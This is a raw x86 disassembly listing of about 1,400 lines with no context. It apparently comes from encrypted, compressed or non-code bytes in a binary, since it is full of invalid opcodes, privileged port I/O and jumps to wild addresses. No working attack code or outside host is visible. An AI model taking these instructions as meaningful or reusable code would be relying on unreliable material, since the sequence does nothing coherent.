  418c8b:	sbb    DWORD PTR [edi+ebx*4-0x76],0xc409b7bd
  418c93:	xchg   ecx,eax
  418c94:	rcl    BYTE PTR [ecx+0x36],cl
  418c97:	into   
  418c98:	push   eax
  418c99:	xchg   eax,ebx
  418c9b:	mov    al,bh
  418c9d:	pusha  
  418c9e:	push   0x13436297
  418ca3:	div    BYTE PTR [eax-0x2d]
  418ca6:	xor    eax,0x8a9d623c
  418cab:	sbb    bh,bh
  418cad:	fnstsw WORD PTR [esi+0x17]
  418cb0:	pop    ecx
  418cb1:	jmp    0x17ec7255
  418cb6:	push   esi
  418cb7:	icebp  
  418cb8:	xor    eax,0x47aad803
  418cbd:	xlat   BYTE PTR ds:[ebx]
  418cbe:	jbe    0x418c5e
  418cc0:	add    eax,0x9bb3e44f
  418cc5:	adc    dh,BYTE PTR [ebx+0x12]
  418cc8:	cmp    BYTE PTR [edx],cl
  418cca:	dec    esi
  418ccb:	hlt    
  418ccc:	cli    
  418ccd:	dec    edi
  418cce:	stos   BYTE PTR es:[edi],al
  418ccf:	cmp    BYTE PTR [ebp-0x67],dh
  418cd2:	xor    ch,ch
  418cd4:	loop   0x418cb3
  418cd6:	rcl    DWORD PTR [edx-0x12a94786],cl
  418cdc:	mov    DWORD PTR [ebx],0x1e07b7c
  418ce2:	pop    eax
  418ce3:	or     DWORD PTR [ecx],esi
  418ce5:	cs ss pop eax
  418ce8:	imul   ecx,edi,0x1314a123
  418cee:	lods   eax,DWORD PTR ds:[esi]
  418cef:	mov    ch,0xa9
  418cf1:	xchg   esi,eax
  418cf2:	mul    eax
  418cf4:	jg     0x418c8e
  418cf6:	push   edi
  418cf7:	rcl    BYTE PTR [esi-0x4b],1
  418cfa:	inc    ebx
  418cfb:	xor    al,0xb
  418cfd:	ins    BYTE PTR es:[edi],dx
  418cfe:	jp     0x418d3c
  418d00:	xor    DWORD PTR [edx],edi
  418d02:	dec    esp
  418d03:	out    0xe4,al
  418d05:	ds mov ch,0x9
  418d08:	sbb    al,0xd
  418d0a:	loope  0x418c9c
  418d0c:	aaa    
  418d0d:	sbb    al,bh
  418d0f:	test   eax,0xdeb42171
  418d14:	loopne 0x418c97
  418d16:	fsub   st,st(3)
  418d18:	repz push ebp
  418d1a:	popf   
  418d1b:	jb     0x418d45
  418d1d:	ds sbb eax,0xc2f844e2
  418d23:	pop    ebx
  418d24:	sub    al,0x91
  418d26:	mov    BYTE PTR ss:[ecx+0x79],ah
  418d2a:	jnp    0x418d21
  418d2c:	loope  0x418d44
  418d2e:	jmp    0x57488e41
  418d33:	xchg   edx,eax
  418d34:	lods   eax,DWORD PTR ds:[esi]
  418d35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d36:	test   BYTE PTR [edi+esi*1],ah
  418d39:	scas   eax,DWORD PTR es:[edi]
  418d3a:	std    
  418d3b:	neg    BYTE PTR [ebp+0x7edb4e1b]
  418d41:	add    cl,BYTE PTR [edi]
  418d43:	out    dx,al
  418d44:	or     ebx,esp
  418d46:	mov    esi,0x67d280dc
  418d4b:	xchg   ecx,eax
  418d4c:	stc    
  418d4d:	mov    cl,0x7b
  418d4f:	mov    bh,0x2e
  418d51:	clc    
  418d52:	pop    ss
  418d53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d54:	ds push ebx
  418d56:	lods   eax,DWORD PTR ds:[esi]
  418d57:	(bad)  
  418d59:	outs   dx,DWORD PTR ds:[esi]
  418d5a:	leave  
  418d5b:	test   eax,0x63a71ca5
  418d60:	pcmpeqw mm7,QWORD PTR [ecx-0x7a87ce87]
  418d67:	jne    0x418d65
  418d69:	cmc    
  418d6a:	out    dx,al
  418d6b:	scas   eax,DWORD PTR es:[edi]
  418d6c:	sub    ebp,DWORD PTR [ebx+0x6543bd22]
  418d72:	xlat   BYTE PTR ds:[ebx]
  418d73:	push   cs
  418d74:	enter  0xb265,0x60
  418d78:	xor    eax,0x483ad916
  418d7e:	xchg   edi,ebx
  418d80:	adc    dh,BYTE PTR [eax]
  418d82:	imul   eax,DWORD PTR [eax+0x5f9c02bf],0xcae942ad
  418d8c:	fistp  DWORD PTR [edi]
  418d8e:	push   0xdea1ba23
  418d93:	out    dx,eax
  418d94:	dec    edi
  418d95:	rsqrtps xmm0,xmm7
  418d98:	mov    eax,0x34b8a77a
  418d9d:	imul   edx,ecx,0xfffffff9
  418da0:	sub    eax,0x980a95ad
  418da5:	sub    edx,ebp
  418da7:	mov    esi,0x9f2a5f20
  418dac:	xor    al,0x72
  418dae:	dec    edi
  418daf:	(bad)  
  418db0:	ins    BYTE PTR es:[edi],dx
  418db1:	inc    edi
  418db2:	(bad)  
  418db4:	test   BYTE PTR [eax+0x48b942fe],0x5b
  418dbb:	aas    
  418dbc:	xchg   DWORD PTR [edx],ecx
  418dbe:	or     al,0x30
  418dc0:	mov    bl,0xd6
  418dc2:	mov    eax,0x35d4038d
  418dc7:	or     bh,cl
  418dc9:	std    
  418dca:	adc    bh,BYTE PTR [ebx]
  418dcc:	mov    eax,0x46995e5
  418dd1:	and    ah,BYTE PTR [edx]
  418dd3:	loop   0x418de2
  418dd5:	adc    DWORD PTR [edx],ebp
  418dd7:	dec    edi
  418dd8:	int    0xfc
  418dda:	int3   
  418ddb:	pushf  
  418ddc:	pop    DWORD PTR [edi-0x45]
  418ddf:	stos   DWORD PTR es:[edi],eax
  418de0:	mov    ebx,0x3eddb7fd
  418de5:	shl    BYTE PTR [ecx],cl
  418de7:	aam    0xcc
  418de9:	jo     0x418da4
  418deb:	icebp  
  418dec:	cmp    edi,0xd5a4a9fe
  418df2:	mov    edx,0xb48cd0d2
  418df7:	inc    BYTE PTR [esi+0x7bda440f]
  418dfd:	pop    eax
  418dfe:	mov    ch,0x7b
  418e00:	adc    bh,0xd2
  418e03:	jns    0x418dea
  418e05:	jle    0x418e82
  418e07:	aaa    
  418e08:	add    eax,0x12cf2254
  418e0d:	ffreep st(2)
  418e0f:	jmp    0x5e4b:0xa99cab22
  418e16:	fidiv  DWORD PTR [esi+0xf]
  418e19:	rol    DWORD PTR ds:0xbf291ea7,0x2a
  418e20:	mov    ds,WORD PTR ss:[ebx-0x57453429]
  418e27:	push   esp
  418e28:	scas   al,BYTE PTR es:[edi]
  418e29:	mov    WORD PTR [ebp+0x2e],?
  418e2c:	mov    al,0xcb
  418e2e:	push   esi
  418e2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e30:	jmp    0x332e1b0a
  418e35:	push   ds
  418e36:	xchg   BYTE PTR es:[edi+0x300842a4],bl
  418e3d:	ins    BYTE PTR es:[edi],dx
  418e3e:	jmp    0x418e2e
  418e40:	sti    
  418e41:	test   BYTE PTR [edi],al
  418e43:	das    
  418e44:	retf   0x8645
  418e47:	repnz mov eax,0x6f599ba
  418e4d:	push   0xc50f3bfd
  418e52:	call   0x161fdc53
  418e57:	sub    cl,BYTE PTR [esi+0x5e]
  418e5a:	xchg   ecx,eax
  418e5b:	push   edx
  418e5c:	cmc    
  418e5d:	inc    ecx
  418e5e:	sub    DWORD PTR [ecx+0x78],eax
  418e61:	shr    BYTE PTR [ecx-0x54bca7e7],0xa9
  418e68:	test   eax,0x739d45d7
  418e6d:	lock pop ebx
  418e6f:	inc    edx
  418e70:	jne    0x418e26
  418e72:	mov    BYTE PTR [eax-0x4d],ch
  418e75:	dec    eax
  418e76:	dec    edx
  418e77:	push   ss
  418e78:	stos   DWORD PTR es:[edi],eax
  418e79:	adc    eax,0xdd9c9f2a
  418e7e:	into   
  418e7f:	iret   
  418e80:	cwde   
  418e81:	xlat   BYTE PTR ds:[ebx]
  418e82:	fdiv   QWORD PTR [edi]
  418e84:	jae    0x418e50
  418e86:	retf   
  418e87:	pop    edi
  418e88:	mov    bh,0xe5
  418e8a:	int3   
  418e8b:	bound  eax,QWORD PTR [ebp-0x660c326b]
  418e91:	out    0xfc,eax
  418e93:	lods   al,BYTE PTR ds:[esi]
  418e94:	in     al,dx
  418e95:	fcomp  QWORD PTR [ecx-0x1f]
  418e98:	es jnp 0x418ec4
  418e9b:	add    esi,esp
  418e9d:	ror    BYTE PTR [eax-0x75bd7728],0xe2
  418ea4:	sbb    edx,edx
  418ea6:	ins    DWORD PTR es:[edi],dx
  418ea7:	rcl    DWORD PTR [ecx],0x18
  418eaa:	(bad)  
  418eab:	sbb    ecx,DWORD PTR [edi]
  418ead:	popa   
  418eae:	pop    ebx
  418eaf:	and    eax,0x9d9d7838
  418eb4:	retf   0xe471
  418eb7:	or     bh,BYTE PTR [eax+eax*1]
  418eba:	cld    
  418ebb:	cmp    al,BYTE PTR [ebx-0x5f]
  418ebe:	retf   0x2af7
  418ec1:	(bad)  
  418ec2:	repnz sbb esp,ebp
  418ec5:	pop    eax
  418ec6:	in     al,dx
  418ec7:	js     0x418ed7
  418ec9:	fistp  QWORD PTR [ecx]
  418ecb:	jns    0x418f1b
  418ecd:	ja     0x418e7b
  418ecf:	adc    DWORD PTR [bx+si],esi
  418ed2:	shr    BYTE PTR [esi],1
  418ed4:	xchg   edx,eax
  418ed5:	push   esp
  418ed6:	scas   al,BYTE PTR es:[edi]
  418ed7:	or     BYTE PTR [ebp+0xe5b4358],0xf4
  418ede:	sbb    al,0x9b
  418ee0:	add    edx,eax
  418ee2:	fld    TBYTE PTR [esi-0x9e05f4f]
  418ee8:	dec    edx
  418ee9:	push   ss
  418eea:	xchg   esi,eax
  418eeb:	dec    edx
  418eec:	mov    edx,0xadb00e50
  418ef1:	dec    esi
  418ef2:	popf   
  418ef3:	jg     0x418f28
  418ef5:	(bad)  
  418ef6:	xchg   edx,eax
  418ef7:	cwde   
  418ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ef9:	je     0x418f24
  418efb:	clc    
  418efc:	mov    eax,ds:0xa83019cb
  418f01:	neg    BYTE PTR [esi+ebx*4+0x5a]
  418f05:	mov    cl,0x64
  418f07:	repz mov edi,0x4599437f
  418f0d:	outs   dx,BYTE PTR ds:[esi]
  418f0e:	cmp    cl,BYTE PTR [ebp-0x532f5bb4]
  418f14:	mov    eax,0x62699b72
  418f19:	mov    bh,al
  418f1b:	out    dx,eax
  418f1c:	sbb    ecx,DWORD PTR [esi+0x41]
  418f1f:	inc    esp
  418f20:	pop    ebp
  418f21:	outs   dx,BYTE PTR ds:[esi]
  418f22:	mov    dl,ch
  418f24:	(bad)  
  418f25:	fisttp QWORD PTR [ebx-0x52]
  418f28:	(bad)  
  418f29:	dec    ebp
  418f2a:	jae    0x418f66
  418f2c:	int    0x73
  418f2e:	jno    0x418f5c
  418f30:	xchg   esp,eax
  418f31:	(bad)  
  418f32:	sub    al,0x2a
  418f34:	psraw  mm0,QWORD PTR [edx+0x4a]
  418f38:	sbb    DWORD PTR [eax-0x4ca8263c],esp
  418f3e:	and    BYTE PTR [ebp+0x54],dh
  418f41:	add    ebx,DWORD PTR [ecx-0x4a]
  418f44:	sbb    eax,0x25765ba8
  418f49:	or     edi,DWORD PTR [ecx-0x7]
  418f4c:	cvtps2pi mm7,QWORD PTR [ecx-0x5]
  418f50:	pop    ecx
  418f51:	pop    esi
  418f52:	mov    ds:0x52433d2d,eax
  418f57:	mov    ecx,0x310a1539
  418f5c:	mov    ebx,eax
  418f5e:	dec    ecx
  418f60:	add    ecx,ecx
  418f62:	inc    eax
  418f63:	cld    
  418f64:	out    0x27,eax
  418f66:	pop    ecx
  418f67:	sbb    al,0xa0
  418f69:	in     al,dx
  418f6a:	mov    ds:0x9ef4f99e,al
  418f6f:	inc    edi
  418f70:	int3   
  418f71:	mov    al,ds:0x2676f029
  418f76:	push   es
  418f77:	ins    BYTE PTR es:[edi],dx
  418f78:	sub    ebp,DWORD PTR [eax+0x60b81f41]
  418f7e:	push   edi
  418f7f:	repnz and BYTE PTR ss:[ebx],bl
  418f83:	nop    DWORD PTR [edx-0x610ec774]
  418f8a:	xchg   esi,eax
  418f8b:	and    edx,edx
  418f8d:	cmc    
  418f8e:	imul   ecx,DWORD PTR [edi-0x5f],0x4bed763c
  418f95:	or     bl,BYTE PTR [edi+eax*1]
  418f98:	cs pop edi
  418f9a:	mov    DWORD PTR cs:[edi+ebp*1-0x39],esi
  418f9f:	dec    esp
  418fa0:	call   0x731fdc36
  418fa5:	retf   0xf0f6
  418fa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fa9:	xor    bl,BYTE PTR [edx+0x24]
  418fac:	cmp    edx,DWORD PTR [eax*2+0x711bbbcb]
  418fb3:	fbstp  TBYTE PTR [esi-0x76]
  418fb6:	and    BYTE PTR [eax+0x74],ch
  418fb9:	push   ds
  418fba:	pop    ecx
  418fbb:	jge    0x418fa0
  418fbd:	adc    al,dl
  418fbf:	push   ds
  418fc0:	fisttp WORD PTR [ebx-0xd]
  418fc3:	xor    cl,al
  418fc5:	inc    edx
  418fc6:	jns    0x418fd3
  418fc8:	xor    al,0x67
  418fca:	in     al,0x27
  418fcc:	dec    eax
  418fcd:	sbb    BYTE PTR [esi+0x2c9adf2e],bh
  418fd3:	sub    eax,0xe03f8c28
  418fd8:	xor    DWORD PTR [ebx+esi*1],ecx
  418fdb:	aaa    
  418fdc:	mov    edx,0x60e36e01
  418fe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fe2:	or     DWORD PTR [edi+0x4e],edx
  418fe5:	jl     0x418fdd
  418fe7:	jmp    0xf96:0x24f4bf61
  418fee:	add    al,0xc8
  418ff0:	mov    eax,0xe55c9bd8
  418ff5:	inc    ecx
  418ff7:	xchg   esp,eax
  418ff8:	cli    
  418ff9:	cld    
  418ffa:	lahf   
  418ffb:	jmp    0x418fc9
  418ffd:	sbb    al,BYTE PTR [ebp+eax*4+0x51]
  419001:	dec    edi
  419002:	pop    ds
  419003:	jnp    0x41907c
  419005:	and    edx,DWORD PTR [ebx+ebp*4-0x77]
  419009:	pop    ebx
  41900a:	fcmovne st,st(6)
  41900c:	in     eax,0x4
  41900e:	and    eax,0x4601d08a
  419013:	daa    
  419014:	mov    ebx,0xe3992546
  419019:	js     0x41903c
  41901b:	ds in  eax,0xf6
  41901e:	push   es
  41901f:	(bad)  
  419021:	lahf   
  419022:	mov    bh,0x30
  419024:	ja     0x41900b
  419026:	inc    eax
  419027:	jno    0x419085
  419029:	add    DWORD PTR [edi],edx
  41902b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41902c:	data16 int 0x46
  41902f:	sahf   
  419030:	push   ecx
  419031:	fsubr  DWORD PTR [edi+0x2b636c8e]
  419037:	(bad)  
  419038:	cmp    bl,dh
  41903a:	clc    
  41903b:	scas   al,BYTE PTR es:[edi]
  41903c:	jbe    0x41906c
  41903e:	push   es
  41903f:	test   al,0x9b
  419041:	enterw 0xf12c,0xcd
  419046:	or     eax,0xd905f557
  41904b:	icebp  
  41904c:	daa    
  41904d:	inc    ebp
  41904e:	test   al,0xa
  419050:	sub    eax,0xf1b0943e
  419055:	cmp    eax,0xce8726b9
  41905a:	call   0x8a7:0x7b625e94
  419061:	stos   BYTE PTR es:[edi],al
  419062:	xor    al,0xea
  419064:	pop    ebx
  419065:	(bad)  
  419066:	mov    ch,0x78
  419068:	shr    BYTE PTR [ebx+0x63cbc978],0xcc
  41906f:	(bad)  
  419070:	and    ah,bh
  419072:	pop    edi
  419073:	lods   eax,DWORD PTR ds:[esi]
  419074:	out    dx,eax
  419075:	mov    WORD PTR [ebx-0x3b34113c],gs
  41907b:	arpl   WORD PTR ds:0x204c9f25,sp
  419081:	sbb    BYTE PTR [edx],bh
  419083:	sbb    ecx,eax
  419085:	and    DWORD PTR [ebp+0x687ce75a],edx
  41908b:	dec    ecx
  41908c:	inc    esp
  41908d:	imul   DWORD PTR [ebx+ebp*1]
  419090:	cmp    edi,eax
  419092:	push   esi
  419093:	icebp  
  419094:	jno    0x41902c
  419096:	and    al,0x1e
  419098:	out    0x43,eax
  41909a:	fdivp  st(2),st
  41909c:	xor    cl,dh
  41909e:	(bad)  
  4190a0:	ret    
  4190a1:	dec    edi
  4190a2:	pop    DWORD PTR [esi-0x6201183]
  4190a8:	fbld   TBYTE PTR [ecx-0x66]
  4190ab:	xor    eax,DWORD PTR [eax]
  4190ad:	jg     0x4190f6
  4190af:	xchg   edi,eax
  4190b0:	in     al,dx
  4190b1:	jbe    0x419129
  4190b3:	cwde   
  4190b4:	cmp    BYTE PTR [eax+0x548d9b67],cl
  4190ba:	mov    DWORD PTR [edx],esp
  4190bc:	aad    0xd4
  4190be:	adc    DWORD PTR ds:0x8f04ae99,ebp
  4190c4:	aam    0x7
  4190c6:	call   0x946710e
  4190cb:	cli    
  4190cc:	clc    
  4190cd:	sbb    al,0x82
  4190cf:	ror    BYTE PTR ds:0x4da3800f,0x1
  4190d6:	xchg   ebx,eax
  4190d7:	inc    eax
  4190d8:	mov    ds:0x88e58138,al
  4190dd:	sbb    DWORD PTR [edx],0xe4dadb20
  4190e3:	adc    eax,0x71089f91
  4190e8:	into   
  4190e9:	shl    BYTE PTR [edx],0x30
  4190ec:	out    0xee,al
  4190ee:	push   ebp
  4190ef:	call   0xef10:0xcbcfdedb
  4190f6:	rcr    esp,1
  4190f8:	pop    edi
  4190f9:	jl     0x419171
  4190fb:	inc    eax
  4190fc:	cmp    al,0x31
  4190fe:	xchg   BYTE PTR [ebx+0xc],al
  419101:	cmc    
  419102:	out    dx,al
  419103:	cmp    BYTE PTR [eax+0x32ae3387],bh
  419109:	and    eax,0x76343827
  41910e:	mov    ah,0xe0
  419110:	lods   al,BYTE PTR ds:[esi]
  419111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419112:	xchg   ebp,eax
  419113:	sbb    esp,eax
  419115:	push   ds
  419116:	push   esp
  419117:	fwait
  419118:	popa   
  419119:	push   edi
  41911a:	(bad)  
  41911b:	sub    al,0xee
  41911d:	mov    dh,0xc5
  41911f:	js     0x41919b
  419121:	dec    ebx
  419122:	outs   dx,DWORD PTR ds:[esi]
  419123:	jo     0x41917d
  419125:	fisubr DWORD PTR ss:0xe1fde5f1
  41912c:	mov    WORD PTR [ecx-0x47],ds
  41912f:	lahf   
  419130:	mov    al,0x5
  419132:	mov    ch,0x3d
  419134:	add    eax,0xa2787520
  419139:	and    eax,0xaa9cc1a9
  41913e:	bound  ebp,QWORD PTR [ecx+0x343af79c]
  419144:	scas   eax,DWORD PTR es:[edi]
  419145:	inc    ebx
  419146:	push   ebx
  419147:	fidiv  WORD PTR ds:0xf8e6b594
  41914d:	mov    al,ds:0x1d7917f9
  419152:	or     esp,esi
  419154:	outs   dx,DWORD PTR ds:[esi]
  419155:	add    ecx,DWORD PTR [eax+edx*4+0x5f51eed4]
  41915c:	loopne 0x4191b5
  41915e:	mov    dh,0x90
  419160:	test   DWORD PTR [esi-0x6e5ee1b3],ecx
  419166:	shl    BYTE PTR [edi+eax*2-0x75],1
  41916a:	outs   dx,BYTE PTR ds:[esi]
  41916b:	dec    edx
  41916c:	lea    ebp,[ebp+0x252f57c]
  419172:	mov    eax,0xa9da8d30
  419177:	dec    ebp
  419178:	idiv   DWORD PTR [ebp+0x584045e7]
  41917e:	adc    al,0x2b
  419180:	mov    WORD PTR [esi+0x56],es
  419183:	das    
  419184:	ret    0xb1e4
  419187:	jbe    0x419187
  419189:	jb     0x41918e
  41918b:	jb     0x41919f
  41918d:	imul   ecx,eax,0xb301575e
  419193:	jl     0x419204
  419195:	xchg   esi,eax
  419196:	jp     0x4191b9
  419198:	jmp    0x88e5c7ca
  41919d:	cwde   
  41919e:	xor    edi,DWORD PTR ds:0x51a58aab
  4191a4:	test   esi,0xe316b936
  4191aa:	cmp    eax,0xb172be1a
  4191af:	xchg   esi,eax
  4191b0:	mov    eax,ds:0xdbcffaf8
  4191b5:	(bad)  
  4191b6:	adc    DWORD PTR [esi],edx
  4191b8:	xlat   BYTE PTR ds:[ebx]
  4191b9:	std    
  4191ba:	xor    al,0x54
  4191bc:	inc    esp
  4191bd:	ins    BYTE PTR es:[edi],dx
  4191be:	lods   al,BYTE PTR ds:[esi]
  4191bf:	mov    dh,0xdf
  4191c1:	les    edi,FWORD PTR [ebx]
  4191c3:	mov    ds:0x9bc31896,eax
  4191c8:	push   ecx
  4191c9:	pushf  
  4191ca:	test   bh,dh
  4191cc:	ficom  WORD PTR [ecx+0x751f67d]
  4191d2:	es mov edx,0xbfa9590c
  4191d8:	jbe    0x41921a
  4191da:	push   ecx
  4191db:	or     eax,0xa7c4bc1b
  4191e0:	jecxz  0x41923b
  4191e2:	out    0x73,eax
  4191e4:	or     dh,BYTE PTR [ecx+0x2a60f507]
  4191ea:	pop    ds
  4191eb:	stos   BYTE PTR es:[edi],al
  4191ec:	loopne 0x4191f8
  4191ee:	inc    ecx
  4191ef:	inc    esi
  4191f0:	(bad)  
  4191f1:	push   ss
  4191f2:	dec    ebx
  4191f3:	push   esi
  4191f4:	jle    0x419273
  4191f6:	fimul  WORD PTR [esp+edx*8-0x2fe9edfa]
  4191fd:	push   0x5ea0d3be
  419202:	jmp    0xebe3a893
  419207:	or     eax,0xd8b0f7b8
  41920c:	sbb    dh,BYTE PTR [edx-0x7c11a723]
  419212:	ja     0x41919c
  419214:	retf   0xb1e4
  419217:	mov    DWORD PTR [edi],ecx
  419219:	out    0x9f,eax
  41921b:	jnp    0x4191d0
  41921d:	mov    al,ds:0x837170f4
  419222:	inc    ebp
  419223:	pop    esp
  419224:	(bad)  
  419225:	fist   DWORD PTR [edx+0x1a]
  419228:	add    dh,BYTE PTR [edi+0xd]
  41922b:	lds    edx,FWORD PTR [edi+0x77]
  41922e:	xchg   edi,eax
  41922f:	add    BYTE PTR [edi],0x5
  419232:	in     al,0x3c
  419234:	jbe    0x4191dc
  419236:	mov    ecx,0x8cd21d52
  41923b:	ds inc esp
  41923d:	xor    ch,BYTE PTR [eax-0xcf199f8]
  419243:	mov    ecx,0x552b6bc
  419248:	push   esi
  419249:	jne    0x41926c
  41924b:	adc    edi,DWORD PTR [ecx]
  41924d:	jbe    0x4192b4
  41924f:	push   ss
  419250:	fdiv   DWORD PTR [esi+0x187d2ab8]
  419256:	adc    eax,0x6a2ac7f6
  41925b:	(bad)  
  41925c:	rcr    ebx,cl
  41925e:	adc    BYTE PTR [eax+0x73],ch
  419261:	je     0x4192c5
  419263:	mov    edi,0xcdba686b
  419268:	pop    es
  419269:	inc    ecx
  41926a:	jecxz  0x41922e
  41926c:	aas    
  41926d:	test   DWORD PTR [edx-0x4b],esi
  419270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419271:	ds addr16 js 0x419282
  419275:	sub    al,0xa1
  419277:	lods   eax,DWORD PTR ds:[esi]
  419278:	push   ds
  419279:	out    dx,al
  41927a:	dec    ebx
  41927b:	and    eax,0xe2ab6fe5
  419280:	jnp    0x4192ef
  419282:	outs   dx,BYTE PTR ds:[esi]
  419283:	dec    edx
  419284:	jg     0x419299
  419286:	jg     0x4192b4
  419288:	dec    esp
  419289:	and    eax,0x4be63672
  41928e:	repnz iret 
  419290:	das    
  419291:	dec    ecx
  419292:	retf   0xb67d
  419295:	mov    bh,0xf4
  419297:	in     eax,0xce
  419299:	pushf  
  41929a:	pop    eax
  41929b:	sub    cl,BYTE PTR [ebx-0x34833140]
  4192a1:	nop
  4192a2:	add    al,0xc5
  4192a4:	out    dx,al
  4192a5:	pushf  
  4192a6:	out    0xe4,eax
  4192a8:	sbb    ebp,DWORD PTR [ecx-0x4b]
  4192ab:	jno    0x41931a
  4192ad:	add    esi,DWORD PTR [ebp-0x446409ec]
  4192b3:	inc    edi
  4192b4:	sbb    BYTE PTR [edi],0xfc
  4192b7:	sahf   
  4192b8:	xor    DWORD PTR [esi],esp
  4192ba:	shl    BYTE PTR [edx],0xb2
  4192bd:	sub    al,0xa
  4192bf:	push   0xadba822c
  4192c4:	pop    ebx
  4192c5:	or     DWORD PTR [edi-0x78],0x55
  4192c9:	sbb    DWORD PTR [ebx+0x63ea0d2d],eax
  4192cf:	jg     0x4192a5
  4192d1:	push   eax
  4192d2:	adc    ebp,ecx
  4192d4:	test   eax,0xc68c9f75
  4192d9:	repz push ecx
  4192db:	inc    esp
  4192dc:	ud2    
  4192de:	shl    DWORD PTR [esi+0x2040f948],0x9c
  4192e5:	mov    cl,0x5e
  4192e7:	mov    al,0xca
  4192e9:	cwde   
  4192ea:	pop    ebp
  4192eb:	dec    edi
  4192ec:	mov    edx,0x326eac63
  4192f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f2:	cli    
  4192f3:	mov    eax,0x6adfad38
  4192f8:	or     al,0xce
  4192fa:	sub    DWORD PTR [ebp+0x3fca4f66],ecx
  419300:	stc    
  419301:	mov    ds:0x75c1692,al
  419306:	int3   
  419307:	pop    ds
  419308:	push   bx
  41930a:	or     esi,ecx
  41930c:	fisttp WORD PTR [eax-0x58]
  41930f:	mov    ds:0x687f9a18,eax
  419314:	outs   dx,BYTE PTR ds:[esi]
  419315:	xchg   esp,eax
  419316:	xchg   DWORD PTR [ebp-0x34cb09d9],esi
  41931c:	cmp    al,0xc4
  41931e:	xor    BYTE PTR [eax+0xb],cl
  419321:	std    
  419322:	mov    esp,0x74538df3
  419327:	mov    edi,0xa32c2f9
  41932c:	cmp    esi,esi
  41932e:	arpl   WORD PTR [ebx],ax
  419330:	aam    0x67
  419332:	push   ecx
  419333:	jns    0x419311
  419335:	test   eax,0x54fe9c3b
  41933a:	sbb    dh,bl
  41933c:	dec    ecx
  41933d:	pop    es
  41933e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41933f:	pop    edi
  419340:	mov    ebx,DWORD PTR [esi-0x63d72039]
  419346:	inc    edx
  419347:	mov    WORD PTR ds:0xd80fe4e3,?
  41934e:	pop    es
  41934f:	mov    ss,WORD PTR [edi-0x2e]
  419352:	stc    
  419353:	jo     0x4193bd
  419355:	out    0x93,al
  419357:	dec    ecx
  419358:	jl     0x419341
  41935a:	(bad)  
  41935b:	rcr    BYTE PTR [ebx],0xaf
  41935e:	lds    ecx,FWORD PTR [esi+0x3716dd91]
  419364:	pop    ecx
  419365:	popf   
  419366:	stos   BYTE PTR es:[edi],al
  419367:	xchg   ebp,eax
  419368:	and    ebx,DWORD PTR [edx]
  41936a:	dec    esp
  41936b:	xchg   esi,eax
  41936c:	rol    DWORD PTR [ebx+0x2d],0xab
  419370:	dec    ebx
  419371:	ret    0xd680
  419374:	pop    edx
  419375:	sub    eax,eax
  419377:	adc    eax,0x68b8ccba
  41937c:	ds push esp
  41937e:	pop    ebx
  41937f:	pop    ebx
  419380:	in     al,dx
  419381:	fdivr  DWORD PTR [esi+esi*1-0x2d094e1a]
  419388:	xchg   edx,eax
  419389:	push   ebp
  41938a:	jle    0x419399
  41938c:	mov    eax,0x18794b43
  419391:	mov    edi,0x42032e2a
  419396:	lahf   
  419397:	int3   
  419398:	mov    bh,0xc1
  41939a:	les    edx,FWORD PTR [ebx+0xf]
  41939d:	push   eax
  41939e:	adc    BYTE PTR [ebx+esi*2-0x17],cl
  4193a2:	adc    al,0x17
  4193a4:	push   ecx
  4193a5:	fwait
  4193a6:	xchg   esp,eax
  4193a7:	jbe    0x41934b
  4193a9:	gs xchg edi,eax
  4193ab:	and    eax,0x422a94c3
  4193b0:	jae    0x41942f
  4193b2:	adc    DWORD PTR [edx-0x17],0xeb20e58d
  4193b9:	push   ebx
  4193ba:	addr16 (bad) 
  4193bc:	sub    DWORD PTR [ebx-0x225d961f],edi
  4193c2:	mov    dl,0x16
  4193c4:	dec    edx
  4193c5:	ficomp DWORD PTR [esi]
  4193c7:	or     al,BYTE PTR [edi+0x40]
  4193ca:	jo     0x4193d9
  4193cc:	dec    ebp
  4193cd:	sbb    DWORD PTR [eax],ebx
  4193cf:	sub    eax,0x61b8e84a
  4193d4:	aam    0x74
  4193d6:	daa    
  4193d7:	retf   0xa5eb
  4193da:	ja     0xf65fb621
  4193e0:	or     DWORD PTR cs:[eax+0x42],edi
  4193e4:	and    ch,BYTE PTR ds:[edi]
  4193e7:	jg     0x4193cb
  4193e9:	dec    ebp
  4193ea:	faddp  st(3),st
  4193ec:	sbb    esi,DWORD PTR [eax-0x980b33]
  4193f2:	fst    QWORD PTR [edi]
  4193f4:	das    
  4193f5:	pop    esi
  4193f6:	mov    cl,0xc6
  4193f8:	in     al,0x55
  4193fa:	xchg   BYTE PTR [ebx+0x33],bl
  4193fd:	lods   al,BYTE PTR ds:[esi]
  4193fe:	sub    DWORD PTR [eax],0xffffffa4
  419401:	pop    ebp
  419402:	cmp    al,0x3d
  419404:	add    eax,0x1345f4cf
  419409:	ds loop 0x4193da
  41940c:	repnz add DWORD PTR ds:0xd911cd12,eax
  419413:	sbb    DWORD PTR [esi],ebp
  419415:	push   esi
  419416:	inc    edx
  419417:	jmp    0x4193e9
  419419:	mov    edi,DWORD PTR [ebx-0x4c]
  41941c:	push   esp
  41941d:	xor    al,0xa5
  41941f:	cmp    esi,DWORD PTR [edx+0x7f]
  419422:	dec    edx
  419423:	push   ebx
  419424:	(bad)  
  419425:	out    0x2a,eax
  419427:	pop    eax
  419428:	mov    eax,ds:0x742374db
  41942d:	scas   eax,DWORD PTR es:[edi]
  41942e:	xchg   ebp,eax
  41942f:	xchg   ebp,eax
  419430:	imul   eax,DWORD PTR [ebp+0x1fc7a64f],0xffffffec
  419437:	sbb    ecx,edx
  419439:	jge    0x4193f8
  41943b:	lea    esi,[edx-0x1af1a705]
  419441:	push   esp
  419442:	cwde   
  419443:	push   cs
  419444:	sti    
  419445:	aam    0x84
  419447:	xor    al,0xd4
  419449:	test   DWORD PTR [edi+0x188fa345],edi
  41944f:	mov    eax,ds:0x3740d636
  419454:	iret   
